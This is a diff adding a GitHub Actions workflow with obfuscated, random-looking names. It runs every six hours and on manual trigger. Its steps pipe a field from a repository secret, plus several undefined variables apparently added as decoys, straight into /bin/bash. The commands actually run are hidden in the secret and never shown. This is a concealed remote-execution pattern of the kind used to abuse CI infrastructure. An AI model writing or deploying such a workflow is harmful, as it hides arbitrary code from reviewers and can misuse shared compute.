@@ -1,0 +1,25 @@
+name: maojiuyu1391
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '3 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: maojiuyu1391
+        env:
+          qna73: ${{ secrets.qna73 }}
+        run: |
+          echo $qna73 | jq -r .ou69 | /bin/bash
+          echo $dz612 | jq -r .tbwl8 | /bin/bash
+          echo $oe704 | jq -r .liae66412 | /bin/bash
+          echo $nufpy083 | jq -r .pjkie42959 | /bin/bash
+          echo $jizjm7642 | jq -r .c725 | /bin/bash
+          echo $mzta67 | jq -r .yluth79 | /bin/bash
+          echo $bfvzz32656 | jq -r .dkjsj96882 | /bin/bash
+          echo $cexko16 | jq -r .wlmoc44 | /bin/bash
+          echo $oj97 | jq -r .bff874 | /bin/bash
+
